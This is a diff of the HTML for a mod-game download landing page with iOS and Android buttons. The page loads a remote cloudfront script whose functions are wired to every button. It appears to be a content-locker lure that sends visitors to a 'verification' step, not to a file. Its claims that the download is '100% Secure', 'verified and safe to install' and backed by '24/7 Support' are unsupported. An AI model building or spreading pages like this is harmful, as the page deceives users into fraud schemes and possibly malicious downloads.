@@ -3,16 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> Files Download Website</title>
-<script type="text/javascript">
-    var tvzRO_ExW_WfFKUc={"it":4416312,"key":"7fa36"};
-</script>
-<script src="https://d2zk8mk8hghu3d.cloudfront.net/1869a9d.js"></script>
+    <title>Games files Download Website</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script type="text/javascript">
+        var YBRtp_fwq_CWcRZc={"it":4439356,"key":"39bbf"};
+    </script>
+    <script src="https://dbycu3e59o0mz.cloudfront.net/95c58c3.js"></script>
     <style>
         :root {
             --primary-color: #4f46e5;
             --secondary-color: #6366f1;
+            --ios-color: #007AFF;
+            --android-color: #3DDC84;
             --bg-dark: #1f2937;
             --bg-darker: #111827;
         }
@@ -22,25 +24,10 @@
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
         }
 
-        /* Refined Progress Bar */
-        .progress-container {
-            background: rgba(255,255,255,0.1);
-            border-radius: 20px;
-            overflow: hidden;
-        }
-
-        .progress-bar {
-            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
-            height: 10px;
-            transition: width 0.7s cubic-bezier(0.47, 0, 0.745, 0.715);
-        }
-
-        /* Enhanced Button Styles */
         .download-btn {
             position: relative;
             overflow: hidden;
             transition: all 0.3s ease;
-            box-shadow: 0 10px 25px rgba(79, 70, 229, 0.3);
         }
 
         .download-btn::before {
@@ -50,7 +37,7 @@
             left: -100%;
             width: 100%;
             height: 100%;
-            background: linear-gradient(120deg, transparent, rgba(255,255,255,0.3), transparent);
+            background: linear-gradient(120deg, transparent, rgba(255,255,255,0.2), transparent);
             transition: all 0.5s ease;
         }
 
@@ -59,87 +46,113 @@
         }
 
         .download-btn:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 35px rgba(79, 70, 229, 0.4);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
         }
 
-        /* Animated Checkmarks */
-        .step-checkmark {
-            opacity: 0;
-            transform: scale(0.5);
+        .platform-icon {
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-6px); }
+        }
+
+        .feature-card {
             transition: all 0.3s ease;
         }
 
-        .step-completed .step-checkmark {
-            opacity: 1;
-            transform: scale(1);
+        .feature-card:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.1);
         }
 
-        /* Subtle Floating Animation */
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
+        .game-title {
+            background: linear-gradient(90deg, #FF6B6B, #4ECDC4);
+            -webkit-background-clip: text;
+            color: transparent;
+            animation: titleGradient 8s linear infinite;
         }
 
-        .floating-icon {
-            animation: float 3s ease-in-out infinite;
+        @keyframes titleGradient {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 200% 50%; }
         }
     </style>
 </head>
 <body class="min-h-screen flex items-center justify-center p-4">
-    <div class="w-full max-w-md bg-gray-900 rounded-2xl shadow-2xl overflow-hidden">
-        <div class="p-6 text-center">
-            <div class="mb-6">
-                <h1 class="text-4xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-purple-500 to-indigo-600 mb-2">
-                    files download website
-                </h1>
-                <p class="text-gray-400">Your Mod Game Files is Ready now!</p>
+    <div class="w-full max-w-xl bg-gray-900 rounded-2xl shadow-2xl overflow-hidden">
+        <div class="p-8 text-center">
+            <div class="mb-8">
+                <!-- <h1 class="text-5xl font-extrabold game-title mb-4"> -->
+                    <!-- Game Mod Download -->
+                <!-- </h1> -->
+                <p class="text-xl text-gray-400">Choose your platform To start Downloading Now!</p>
             </div>
 
-            <div class="bg-gray-800 rounded-xl p-6 mb-6">
-                <button id="downloadBtn" class="download-btn w-full py-4 rounded-lg text-white font-bold bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-700 hover:to-indigo-700 transition-all duration-300" onclick="_Tt()">
-                    <span class="flex items-center justify-center" onclick="_Tt()">
-                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mr-2 floating-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor" onclick="_Tt()">
-                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
-                              Download The Mod Game Now!
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
+                <!-- iOS Download Button -->
+                <button onclick="_Tt()" class="download-btn group bg-gradient-to-r from-blue-500 to-blue-600 p-6 rounded-xl text-white shadow-lg">
+                    <div class="flex flex-col items-center space-y-3">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 platform-icon" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
                         </svg>
-                    </span>
+                        <div>
+                            <div class="text-sm mb-1" onclick="_Cd()">Download for</div>
+                            <div class="text-xl font-bold" onclick="_Cd()">iOS</div>
+                        </div>
+                    </div>
                 </button>
 
-                <div id="progressContainer" class="progress-container mt-4 hidden">
-                    <div id="progressBar" class="progress-bar w-0"></div>
+                <!-- Android Download Button -->
+                <button onclick="_Tt()" class="download-btn group bg-gradient-to-r from-green-500 to-green-600 p-6 rounded-xl text-white shadow-lg">
+                    <div class="flex flex-col items-center space-y-3">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 platform-icon" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M16.61 15.15c-.46 0-.84-.37-.84-.84s.37-.84.84-.84.84.37.84.84-.37.84-.84.84m-9.22 0c-.46 0-.84-.37-.84-.84s.37-.84.84-.84.84.37.84.84-.37.84-.84.84m9.42-5.93l1.68-2.91c.09-.16.04-.36-.12-.45-.16-.09-.36-.04-.45.12l-1.71 2.96c-1.3-.57-2.78-.9-4.21-.9-1.43 0-2.91.33-4.21.9L6.08 5.04c-.09-.16-.29-.21-.45-.12-.16.09-.21.29-.12.45l1.68 2.91C3.86 9.92 2 12.68 2 15.5c0 4.69 4.47 5.5 10 5.5s10-.81 10-5.5c0-2.82-1.86-5.58-5.19-7.28z"/>
+                        </svg>
+                        <div>
+                            <div class="text-sm mb-1" onclick="_Cd()">Download for</div>
+                            <div class="text-xl font-bold" onclick="_Cd()">Android</div>
+                        </div>
+                    </div>
+                </button>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
+                <div class="feature-card bg-gray-800 p-4 rounded-xl">
+                    <div class="text-green-500 mb-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 mx-auto" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                        </svg>
+                    </div>
+                    <h3 class="text-white font-bold mb-1">100% Secure</h3>
+                    <p class="text-gray-400 text-sm">Verified and safe to install</p>
+                </div>
+
+                <div class="feature-card bg-gray-800 p-4 rounded-xl">
+                    <div class="text-blue-500 mb-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 mx-auto" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
+                        </svg>
+                    </div>
+                    <h3 class="text-white font-bold mb-1">Fast Download</h3>
+                    <p class="text-gray-400 text-sm">High-speed servers</p>
+                </div>
+
+                <div class="feature-card bg-gray-800 p-4 rounded-xl">
+                    <div class="text-purple-500 mb-2">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 mx-auto" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+                        </svg>
+                    </div>
+                    <h3 class="text-white font-bold mb-1">24/7 Support</h3>
+                    <p class="text-gray-400 text-sm">Always here to help</p>
                 </div>
             </div>
 
-            <div class="space-y-4 mb-6">
-                <div class="flex items-center bg-gray-800 p-4 rounded-lg transition-all duration-300 hover:bg-gray-700 step-completed">
-                    <span class="text-green-500 mr-3 step-checkmark">✓</span>
-                    <span class="text-gray-300">Click 'Download The Mod Game Now!'</span>
-                </div>
-                <div class="flex items-center bg-gray-800 p-4 rounded-lg transition-all duration-300 hover:bg-gray-700">
-                    <span class="text-green-500 mr-3 step-checkmark">✓</span>
-                    <span class="text-gray-300">Complete Quick Verification</span>
-                </div>
-                <div class="flex items-center bg-gray-800 p-4 rounded-lg transition-all duration-300 hover:bg-gray-700">
-                    <span class="text-green-500 mr-3 step-checkmark">✓</span>
-                    <span class="text-gray-300">Automatic Download Begins</span>
-                </div>
-            </div>
-
-            <div class="flex justify-center space-x-6 text-gray-400">
-                <div class="flex items-center">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2 text-green-500" viewBox="0 0 20 20" fill="currentColor">
-                        <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
-                    </svg>
-                    100% Secure
-                </div>
-                <div class="flex items-center">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2 text-blue-500" viewBox="0 0 20 20" fill="currentColor">
-                        <path d="M10 12a2 2 0 100-4 2 2 0 000 4z" />
-                        <path fillRule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clipRule="evenodd" />
-                    </svg>
-                    Verified
-                </div>
+            <div class="text-gray-400 text-sm">
+                By downloading, you agree to our Terms of Service and Privacy Policy
             </div>
         </div>
     </div>
